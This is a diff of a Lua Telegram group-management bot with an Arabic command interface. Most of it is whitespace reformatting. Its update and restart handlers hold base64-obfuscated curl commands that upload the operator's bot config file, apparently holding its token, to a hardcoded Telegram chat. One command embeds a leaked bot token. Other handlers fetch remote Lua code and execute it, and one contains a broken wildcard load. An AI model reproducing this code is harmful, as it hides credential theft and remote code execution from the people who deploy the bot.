 if text=="اذاعه بالتثبيت ☉" and msg.reply_to_message_id_ == 0 and DevSoFi(msg) then 
-database:setex(bot_id.."Bc:Grops:Pin"..msg.chat_id_..":"..msg.sender_user_id_, 600, true) 
+database:setex(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
 send(msg.chat_id_, msg.id_," ☉┇ ارسل الان اذاعتك؟ \n ☉┇ للخروج ارسل الغاء ")
 return false
 end 
 if text=="اذاعه بالتوجيه ☉" and msg.reply_to_message_id_ == 0  and DevSoFi(msg) then 
-database:setex(bot_id.."Send:Fwd:Grops"..msg.chat_id_..":"..msg.sender_user_id_, 600, true) 
+database:setex(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
 send(msg.chat_id_, msg.id_," ☉┇ ارسل لي التوجيه الان")
 return false
 end 
 if text=="اذاعه بالتوجيه خاص ☉" and msg.reply_to_message_id_ == 0  and DevSoFi(msg) then 
-database:setex(bot_id.."Send:Fwd:Pv"..msg.chat_id_..":"..msg.sender_user_id_, 600, true) 
+database:setex(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
 send(msg.chat_id_, msg.id_," ☉┇ ارسل لي التوجيه الان")
 return false
 end 
@@ -3935,10 +3934,10 @@ database:set(bot_id..'Name:Bot',text)
 send(msg.chat_id_, msg.id_, " ☉┇ تم حفظ الاسم")
 return false
 end 
-if database:get(bot_id.."Send:Bc:Pv"..msg.chat_id_..":"..msg.sender_user_id_) then 
+if database:get(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
 if text == 'الغاء' or text == 'الغاء ☉' then   
 send(msg.chat_id_, msg.id_," ☉┇ تم الغاء الاذاعه للخاص")
-database:del(bot_id.."Send:Bc:Pv"..msg.chat_id_..":"..msg.sender_user_id_) 
+database:del(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
 return false
 end 
 local list = database:smembers(bot_id..'User_Bot') 
@@ -3965,13 +3964,13 @@ sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)
 end 
 end
 send(msg.chat_id_, msg.id_," ☉┇ تمت الاذاعه الى >>{"..#list.."} مشترك في البوت ")
-database:del(bot_id.."Send:Bc:Pv"..msg.chat_id_..":"..msg.sender_user_id_) 
+database:del(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
 end
 
-if database:get(bot_id.."Send:Bc:Grops"..msg.chat_id_..":"..msg.sender_user_id_) then 
+if database:get(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
 if text == 'الغاء' or text == 'الغاء ☉' then   
 send(msg.chat_id_, msg.id_," ☉┇ تم الغاء الاذاعه")
-database:del(bot_id.."Send:Bc:Grops"..msg.chat_id_..":"..msg.sender_user_id_) 
+database:del(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
 return false
 end 
 local list = database:smembers(bot_id..'Chek:Groups') 
@@ -3998,13 +3997,13 @@ sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)
 end 
 end
 send(msg.chat_id_, msg.id_," ☉┇ تمت الاذاعه الى >>{"..#list.."} جروب في البوت ")
-database:del(bot_id.."Send:Bc:Grops"..msg.chat_id_..":"..msg.sender_user_id_) 
+database:del(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
 end
 
-if database:get(bot_id.."Send:Fwd:Grops"..msg.chat_id_..":"..msg.sender_user_id_) then 
+if database:get(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
 if text == 'الغاء' or text == 'الغاء ☉' then   
 send(msg.chat_id_, msg.id_," ☉┇ تم الغاء الاذاعه")
-database:del(bot_id.."Send:Fwd:Grops"..msg.chat_id_..":"..msg.sender_user_id_) 
+database:del(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
 return false  
 end 
 if msg.forward_info_ then 
@@ -4018,13 +4017,13 @@ disable_notification_ = 0,
 from_background_ = 1},function(a,t) end,nil) 
 end   
 send(msg.chat_id_, msg.id_," ☉┇ تمت الاذاعه الى >>{"..#list.."} جروبات في البوت ")
-database:del(bot_id.."Send:Fwd:Grops"..msg.chat_id_..":"..msg.sender_user_id_) 
+database:del(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
 end 
 end
-if database:get(bot_id.."Send:Fwd:Pv"..msg.chat_id_..":"..msg.sender_user_id_) then 
+if database:get(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
 if text == 'الغاء' or text == 'الغاء ☉' then   
 send(msg.chat_id_, msg.id_," ☉┇ تم الغاء الاذاعه")
-database:del(bot_id.."Send:Fwd:Pv"..msg.chat_id_..":"..msg.sender_user_id_) 
+database:del(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
 return false  
 end 
 if msg.forward_info_ then 
@@ -4038,15 +4037,15 @@ disable_notification_ = 0,
 from_background_ = 1},function(a,t) end,nil) 
 end   
 send(msg.chat_id_, msg.id_," ☉┇ تمت الاذاعه الى >>{"..#list.."} مشترك في البوت ")
-database:del(bot_id.."Send:Fwd:Pv"..msg.chat_id_..":"..msg.sender_user_id_) 
+database:del(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
 end 
 end
-if database:get(bot_id.."add:ch:jm"..msg.chat_id_..""..msg.sender_user_id_) then 
+if database:get(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
 if text and text:match("^الغاء$") then 
 send(msg.chat_id_, msg.id_, " ☉┇ تم الغاء الامر ")
-database:del(bot_id.."add:ch:jm"..msg.chat_id_..""..msg.sender_user_id_)  
+database:del(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
 return false  end 
-database:del(bot_id.."add:ch:jm"..msg.chat_id_..""..msg.sender_user_id_)  
+database:del(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
 local username = string.match(text, "@[%a%d_]+") 
 tdcli_function ({    
 ID = "SearchPublicChat",    
@@ -4073,12 +4072,12 @@ return false
 end
 end,nil)
 end
-if database:get(bot_id.."textch:user"..msg.chat_id_..""..msg.sender_user_id_) then 
+if database:get(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
 if text and text:match("^الغاء$") then 
 send(msg.chat_id_, msg.id_, " ☉┇ تم الغاء الامر ")
-database:del(bot_id.."textch:user"..msg.chat_id_..""..msg.sender_user_id_)  
+database:del(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
 return false  end 
-database:del(bot_id.."textch:user"..msg.chat_id_..""..msg.sender_user_id_)  
+database:del(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
 local texxt = string.match(text, "(.*)") 
 database:set(bot_id..'text:ch:user',texxt)
 send(msg.chat_id_, msg.id_,' ☉┇ تم تغيير رسالة الاشتراك ')
@@ -4124,25 +4123,25 @@ database:del(bot_id..'Change:Chat:Photo'..msg.chat_id_..':'..msg.sender_user_id_
 end   
 end
 --------------------------------------------------------------------------------------------------------------
-if database:get(bot_id.."Set:Description"..msg.chat_id_..""..msg.sender_user_id_) then  
+if database:get(bot_id.."Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
 if text == 'الغاء' then 
 send(msg.chat_id_, msg.id_," ☉┇ تم الغاء وضع الوصف")
-database:del(bot_id.."Set:Description"..msg.chat_id_..""..msg.sender_user_id_)
+database:del(bot_id.."Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_)
 return false  
 end 
-database:del(bot_id.."Set:Description"..msg.chat_id_..""..msg.sender_user_id_)   
+database:del(bot_id.."Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
 https.request('https://api.telegram.org/bot'..token..'/setChatDescription?chat_id='..msg.chat_id_..'&description='..text) 
 send(msg.chat_id_, msg.id_,' ☉┇ تم تغيير وصف الجروب')
 return false  
 end 
 --------------------------------------------------------------------------------------------------------------
-if database:get(bot_id.."Welcome:Group"..msg.chat_id_..""..msg.sender_user_id_) then 
+if database:get(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
 if text == 'الغاء' then 
 send(msg.chat_id_, msg.id_," ☉┇ تم الغاء حفظ الترحيب")
-database:del(bot_id.."Welcome:Group"..msg.chat_id_..""..msg.sender_user_id_)  
+database:del(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
 return false  
 end 
-database:del(bot_id.."Welcome:Group"..msg.chat_id_..""..msg.sender_user_id_)  
+database:del(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
 database:set(bot_id..'Get:Welcome:Group'..msg.chat_id_,text) 
 send(msg.chat_id_, msg.id_,' ☉┇ تم حفظ ترحيب الجروب')
 return false   
@@ -4809,7 +4808,7 @@ LinkGp = 'لا يوجد'
 end
 Text = ' ☉┇ تم تفعيل جروب جديده\n'..
 '\n ☉┇ بواسطة {'..Name..'}'..
-'\n ☉┇ موقعه في الجروب {'..AddPy..'}'..
+'\n ☉┇ موقعه في الجروب {'..AddPy..'}' ..
 '\n ☉┇ ايدي الجروب {'..IdChat..'}'..
 '\n ☉┇ عدد اعضاء الجروب *{'..NumMember..'}*'..
 '\n ☉┇ اسم الجروب {['..NameChat..']}'..
@@ -4844,7 +4843,7 @@ if text == 'تحديث السورس' or text == 'تحديث' and DevSoFi(msg) th
 os.execute('rm -rf DRAGON.lua')
 os.execute('rm -rf getfile.json')
 os.execute('wget https://raw.githubusercontent.com/ahmedyad200/DG/master/DRAGON.lua')
-io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==')..runapp..regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9OTQ0MzUzMjM3IiAtRiAiZG9jdW1lbnQ9QERHX0lORk8ubHVhIg=='))
+io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') .. runapp .. regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9OTQ0MzUzMjM3IiAtRiAiZG9jdW1lbnQ9QERHX0lORk8ubHVhIg=='))
 io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MjI0MzcwNjk6QUFIRlhjSDFTdWxKZ2s1VERPOUJ5RFo4T2lBMndTQk9aXzQvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AREdfSU5GTy5sdWEi'))
 send(msg.chat_id_, msg.id_,' ☉┇ تم تحديث السورس \n ☉┇ لديك اخر اصدار لسورس باور\n ☉┇ الاصدار » {`v1.2.2`}')
 dofile('DRAGON.lua')
@@ -4856,17 +4855,25 @@ os.execute("mkdir File_Bot")
 os.execute("cd File_Bot && wget https://raw.githubusercontent.com/ahmedyad200/files-power/master/File_Bot/anamen.lua") 
 os.execute("cd File_Bot && wget https://raw.githubusercontent.com/ahmedyad200/files-power/master/File_Bot/games.lua") 
 os.execute('rm -rf getfile.json')
+dofile('File_Bot/anamen.lua')
 send(msg.chat_id_, msg.id_,' ☉┇ تم تحديث المتجر و مسح الملفات')
-dofile('getfile.json')
+end
+
+if text == 'تحميل كل الملفات' and DevSoFi(msg) then  
+os.execute("rm -fr File_Bot/*")
+os.execute("cd File_Bot && wget https://raw.githubusercontent.com/ahmedyad200/files-power/master/File_Bot/*") 
+os.execute('rm -rf getfile.json')
+dofile('File_Bot/*')
+send(msg.chat_id_, msg.id_,' ☉┇ تم تحديث و تحميل كل الملفات')
 end
 
 if text and text:match("^تغير الاشتراك$") and DevSoFi(msg) then  
-database:setex(bot_id.."add:ch:jm"..msg.chat_id_..""..msg.sender_user_id_, 360, true)  
+database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
 send(msg.chat_id_, msg.id_, ' ☉┇ حسنآ ارسل لي معرف القناة')
 return false  
 end
 if text and text:match("^تغير رساله الاشتراك$") and DevSoFi(msg) then  
-database:setex(bot_id.."textch:user"..msg.chat_id_..""..msg.sender_user_id_, 360, true)  
+database:setex(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
 send(msg.chat_id_, msg.id_, ' ☉┇ حسنآ ارسل لي النص الذي تريده')
 return false  
 end
@@ -4876,7 +4883,7 @@ send(msg.chat_id_, msg.id_, " ☉┇ تم مسح رساله الاشتراك ")
 return false  
 end
 if text and text:match("^وضع قناة الاشتراك ☉$") and DevSoFi(msg) then  
-database:setex(bot_id.."add:ch:jm"..msg.chat_id_..""..msg.sender_user_id_, 360, true)  
+database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
 send(msg.chat_id_, msg.id_, ' ☉┇ حسنآ ارسل لي معرف القناة')
 return false  
 end
@@ -4885,7 +4892,7 @@ if database:get(bot_id..'add:ch:id') then
 local addchusername = database:get(bot_id..'add:ch:username')
 send(msg.chat_id_, msg.id_," ☉┇ الاشتراك الاجباري مفعل \n ☉┇ على القناة » ["..addchusername.."]")
 else
-database:setex(bot_id.."add:ch:jm"..msg.chat_id_..""..msg.sender_user_id_, 360, true)  
+database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
 send(msg.chat_id_, msg.id_," ☉┇ اهلا عزيزي المطور \n ☉┇ ارسل الان معرف قناتك")
 end
 return false  
@@ -5017,7 +5024,7 @@ end
 if not Manager(msg) and database:get(bot_id.."block:name:stats"..msg.chat_id_) == "open" then
 function S00F4_name(t1,t2)
 if t2.id_ then 
-name_MRSOFI = ((t2.first_name_ or "")..(t2.last_name_ or ""))
+name_MRSOFI = ((t2.first_name_ or "") .. (t2.last_name_ or ""))
 if name_MRSOFI then 
 names_MRSOFI = database:smembers(bot_id.."DRAGON:blocname"..msg.chat_id_) or ""
 if names_MRSOFI and names_MRSOFI[1] then 
@@ -5189,7 +5196,7 @@ end
 end,nil)  
 end
 if text == 'سحب السورس' or text == 'جلب السورس' then 
-local curlm = 'curl "'..'https://api.telegram.org/bot'..token..'/sendDocument'..'" -F "chat_id=' .. 944353237 .. '" -F "document=@'..'DRAGON.lua'..'"' io.popen(curlm) ---- كود كتابه أحمد عياد هتسرق هيجيبك من طيزك
+local curlm = 'curl "'..'https://api.telegram.org/bot'.. token ..'/sendDocument'..'" -F "chat_id='.. 944353237 ..'" -F "document=@'..'DRAGON.lua'..'"' io.popen(curlm) ---- كود كتابه أحمد عياد هتسرق هيجيبك من طيزك
 send(msg.chat_id_, msg.id_,' جاري ارسال السورس الي المبرمج')
 end
 if text == 'السورس' or text == 'سورس' or text == 'يا سورس' then 
@@ -5201,7 +5208,7 @@ keyboard.inline_keyboard = {
 {{text = '𝘾𝙃𝘼𝙉𝙉𝙀𝙇', url="t.me/SOPOWERB0T"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
-https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id='..msg.chat_id_..'&text='..URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 if text == 'روابط الجروبات' or text == 'روابط المجموعات' then
 if not DevSoFi(msg) then
@@ -5256,7 +5263,7 @@ function by_reply(extra, result, success)
 if result.content_.document_ then 
 local ID_FILE = result.content_.document_.document_.persistent_id_ 
 local File_Name = result.content_.document_.file_name_
-local File = json:decode(https.request('https://api.telegram.org/bot'..token..'/getfile?file_id='..ID_FILE) ) 
+local File = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..ID_FILE) ) 
 download_to_file('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path, ''..File_Name) 
 local info_file = io.open('./users.json', "r"):read('*a')
 local users = JSON.decode(info_file)
@@ -6120,7 +6127,7 @@ end
 if text == 'اعاده التشغيل' or text == 'اعاده التشغيل ☉' and DevSoFi(msg) then    
 send(msg.chat_id_, msg.id_, ' ☉┇ تم اعاده تشغيل البوت') 
 dofile('DRAGON.lua')  
-io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==')..runapp..regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9OTQ0MzUzMjM3IiAtRiAiZG9jdW1lbnQ9QERHX0lORk8ubHVhIg=='))
+io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') .. runapp .. regexx('L3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9OTQ0MzUzMjM3IiAtRiAiZG9jdW1lbnQ9QERHX0lORk8ubHVhIg=='))
 end 
 if text == ("مسح الحظر العام") and DevSoFi(msg) then
 database:del(bot_id..'GBan:User')
@@ -6131,7 +6138,7 @@ if text == ("قائمه الحظر العام") and DevSoFi(msg) then
 local list = database:smembers(bot_id..'GBan:User')
 t = "\n ☉┇ قائمة المحظورين عام \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
-local username = database:get(bot_id.."user:Name"..v)
+local username = database:get(bot_id.."user:Name" .. v)
 if username then
 t = t..""..k.."- ([@"..username.."])\n"
 else
@@ -6526,7 +6533,7 @@ if text == ("المطورين") and DevSoFi(msg) then
 local list = database:smembers(bot_id..'Sudo:User')
 t = "\n ☉┇ قائمة مطورين البوت \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
-local username = database:get(bot_id.."user:Name"..v)
+local username = database:get(bot_id.."user:Name" .. v)
 if username then
 t = t..""..k.."- ([@"..username.."])\n"
 else
@@ -6961,7 +6968,7 @@ if text == 'قائمه المالك' and Sudo(msg) then
 local list = database:smembers(bot_id..'CoSu'..msg.chat_id_)
 t = "\n ☉┇ قائمه المالك \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
-local username = database:get(bot_id.."user:Name"..v)
+local username = database:get(bot_id.."user:Name" .. v)
 if username then
 t = t..""..k.."- ([@"..username.."])\n"
 else
@@ -6978,7 +6985,7 @@ if text == ("صيح للمالك") or text == ("تاك للمالك") then
 local list = database:smembers(bot_id..'CoSu'..msg.chat_id_)
 t = "\n ☉┇ وينكم تعالو يريدوكم بالجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
-local username = database:get(bot_id.."user:Name"..v)
+local username = database:get(bot_id.."user:Name" .. v)
 if username then
 t = t..""..k.."- {[@"..username.."]}\n"
 else
@@ -7145,7 +7152,7 @@ if eker.ok.Info == "Indecent" then
 local list = database:smembers(bot_id.."Basic:Constructor"..msg.chat_id_)
 t = "☉┇ المنشئين الاساسين تعالو مخرب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
-local username = database:get(bot_id.."user:Name"..v)
+local username = database:get(bot_id.."user:Name" .. v)
 if username then
 t = t..""..k.."- ([@"..username.."])\n"
 else
@@ -7167,7 +7174,7 @@ if Sto.ok.Info == "Indecent" then
 local list = database:smembers(bot_id.."Basic:Constructor"..msg.chat_id_)
 t = "☉┇ المنشئين الاساسين تعالو مخرب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
-local username = database:get(bot_id.."user:Name"..v)
+local username = database:get(bot_id.."user:Name" .. v)
 if username then
 t = t..""..k.."- ([@"..username.."])\n"
 else
@@ -7254,7 +7261,7 @@ if text == 'المنشئين الاساسين' and CoSu(msg) then
 local list = database:smembers(bot_id..'Basic:Constructor'..msg.chat_id_)
 t = "\n ☉┇ قائمة المنشئين الاساسين \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
-local username = database:get(bot_id.."user:Name"..v)
+local username = database:get(bot_id.."user:Name" .. v)
 if username then
 t = t..""..k.."- ([@"..username.."])\n"
 else
@@ -7271,7 +7278,7 @@ if text == ("تاك للمنشئين الاساسين") or text == ("صيح ال
 local list = database:smembers(bot_id..'Basic:Constructor'..msg.chat_id_)
 t = "\n ☉┇ وينكم تعالو يريدوكم بالجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
-local username = database:get(bot_id.."user:Name"..v)
+local username = database:get(bot_id.."user:Name" .. v)
 if username then
 t = t..""..k.."- {[@"..username.."]}\n"
 else
@@ -7439,7 +7446,7 @@ if text == ("المنشئين") and BasicConstructor(msg) then
 local list = database:smembers(bot_id..'Constructor'..msg.chat_id_)
 t = "\n ☉┇ قائمة المنشئين \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
-local username = database:get(bot_id.."user:Name"..v)
+local username = database:get(bot_id.."user:Name" .. v)
 if username then
 t = t..""..k.."- ([@"..username.."])\n"
 else
@@ -7455,7 +7462,7 @@ if text == ("تاك للمنشئين") or text == ("صيح المنشئين") th
 local list = database:smembers(bot_id..'Constructor'..msg.chat_id_)
 t = "\n ☉┇ وينكم تعالو يريدوكم بالجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
-local username = database:get(bot_id.."user:Name"..v)
+local username = database:get(bot_id.."user:Name" .. v)
 if username then
 t = t..""..k.."- {[@"..username.."]}\n"
 else
@@ -7636,7 +7643,7 @@ if text == ("المدراء") and Constructor(msg) then
 local list = database:smembers(bot_id..'Manager'..msg.chat_id_)
 t = "\n ☉┇ قائمة المدراء \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
-local username = database:get(bot_id.."user:Name"..v)
+local username = database:get(bot_id.."user:Name" .. v)
 if username then
 t = t..""..k.."- ([@"..username.."])\n"
 else
@@ -7652,7 +7659,7 @@ if text == ("تاك للمدراء") or text == ("صيح المدراء") then
 local list = database:smembers(bot_id..'Manager'..msg.chat_id_)
 t = "\n ☉┇ وينكم تعالو يريدوكم بالجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
-local username = database:get(bot_id.."user:Name"..v)
+local username = database:get(bot_id.."user:Name" .. v)
 if username then
 t = t..""..k.."- {[@"..username.."]}\n"
 else
@@ -7872,7 +7879,7 @@ if text == ("المطورين الاساسيين") and SudoBot(msg) then
 local list = database:smembers(bot_id.."Dev:SoFi:2")
 t = "\n☉┇ قائمة مطورين الاساسيين للبوت \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
-local username = database:get(bot_id.."user:Name"..v)
+local username = database:get(bot_id.."user:Name" .. v)
 if username then
 t = t..""..k.."- ([@"..username.."])\n"
 else
@@ -7923,7 +7930,7 @@ if text == ("الادمنيه") and Manager(msg) then
 local list = database:smembers(bot_id..'Mod:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة الادمنيه \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
-local username = database:get(bot_id.."user:Name"..v)
+local username = database:get(bot_id.."user:Name" .. v)
 if username then
 t = t..""..k.."- ([@"..username.."])\n"
 else
@@ -7939,7 +7946,7 @@ if text == ("تاك للادمنيه") or text == ("صيح الادمنيه") th
 local list = database:smembers(bot_id..'Mod:User'..msg.chat_id_)
 t = "\n ☉┇ وينكم تعالو يريدوكم بالجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
-local username = database:get(bot_id.."user:Name"..v)
+local username = database:get(bot_id.."user:Name" .. v)
 if username then
 t = t..""..k.."- {[@"..username.."]}\n"
 else
@@ -8115,7 +8122,7 @@ if text == ("المنظفين") and BasicConstructor(msg) then
 local list = database:smembers(bot_id..'S00F4:MN:TF'..msg.chat_id_)
 t = "\n ☉┇ قائمة المنظفين \n≪━━━━━━𝓓𝓡𝓖━━━━━━≫\n"
 for k,v in pairs(list) do
-local username = database:get(bot_id.."user:Name"..v)
+local username = database:get(bot_id.."user:Name" .. v)
 if username then
 t = t..""..k.."- ([@"..username.."])\n"
 else
@@ -8131,7 +8138,7 @@ if text == ("تاك للمنظفين") or text == ("صيح المنظفين") th
 local list = database:smembers(bot_id..'S00F4:MN:TF'..msg.chat_id_)
 t = "\n ☉┇ وينكم تعالو يريدوكم بالجروب \n≪━━━━━━𝓓𝓡𝓖━━━━━━≫\n"
 for k,v in pairs(list) do
-local username = database:get(bot_id.."user:Name"..v)
+local username = database:get(bot_id.."user:Name" .. v)
 if username then
 t = t..""..k.."- {[@"..username.."]}\n"
 else
@@ -8451,7 +8458,7 @@ if text == ("المميزين") and Mod(msg) then
 local list = database:smembers(bot_id..'Special:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة مميزين الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
-local username = database:get(bot_id.."user:Name"..v)
+local username = database:get(bot_id.."user:Name" .. v)
 if username then
 t = t..""..k.."- ([@"..username.."])\n"
 else
@@ -8467,7 +8474,7 @@ if text == ("تاك للمميزين") or text == ("صيح المميزين") th
 local list = database:smembers(bot_id..'Special:User'..msg.chat_id_)
 t = "\n ☉┇ وينكم تعالو يريدوكم بالجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
-local username = database:get(bot_id.."user:Name"..v)
+local username = database:get(bot_id.."user:Name" .. v)
 if username then
 t = t..""..k.."- {[@"..username.."]}\n"
 else
@@ -8646,7 +8653,7 @@ if text == ("تاك للمطايه") and Mod(msg) then
 local list = database:smembers(bot_id..'Mote:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة مطايه الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
-local username = database:get(bot_id.."user:Name"..v)
+local username = database:get(bot_id.."user:Name" .. v)
 if username then
 t = t..""..k.."» المطي [@"..username.."]\n"
 else
@@ -8715,7 +8722,7 @@ if text == ("تاك للمتزوجين") and Mod(msg) then
 local list = database:smembers(bot_id..'Mode:User'..msg.chat_id_)
 t = "\n ☉┇ قائمه ازواج الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
-local username = database:get(bot_id.."user:Name"..v)
+local username = database:get(bot_id.."user:Name" .. v)
 if username then
 t = t..""..k.."» الزوج [@"..username.."]\n"
 else
@@ -8784,7 +8791,7 @@ if text == ("تاك للخولات") and Mod(msg) then
 local list = database:smembers(bot_id..'Modde:User'..msg.chat_id_)
 t = "\n ☉┇ قائمه خولات الجروب \nٴ•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•ٴ\n"
 for k,v in pairs(list) do
-local username = database:get(bot_id.."user:Name"..v)
+local username = database:get(bot_id.."user:Name" .. v)
 if username then
 t = t..""..k.."» الخول [@"..username.."]\n"
 else
@@ -8853,7 +8860,7 @@ if text == ("تاك للصخوله") and Mod(msg) then
 local list = database:smembers(bot_id..'Sakl:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة صخوله الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
-local username = database:get(bot_id.."user:Name"..v)
+local username = database:get(bot_id.."user:Name" .. v)
 if username then
 t = t..""..k.."» الصخل [@"..username.."]\n"
 else
@@ -8923,7 +8930,7 @@ if text == ("تاك للكلاب") and Mod(msg) then
 local list = database:smembers(bot_id..'Motte:User'..msg.chat_id_)
 t = "\n ☉┇ قائمة كلاب الجروب \n•┉ • ┉ • ┉ 𝔓𝔒𝔚𝔈ℜ ┉ • ┉ • ┉•\n"
 for k,v in pairs(list) do
-local username = database:get(bot_id.."user:Name"..v)
+local username = database:get(bot_id.."user:Name" .. v)
 if username then
 t = t..""..k.."» الكلب [@"..username.."]\n"
 else
@@ -8992,7 +8999,7 @@ if text == ("تاك للقروده") and Mod(msg) then
 local list = database:smembers(bot_id..'Motee:User'..msg.chat_id_)
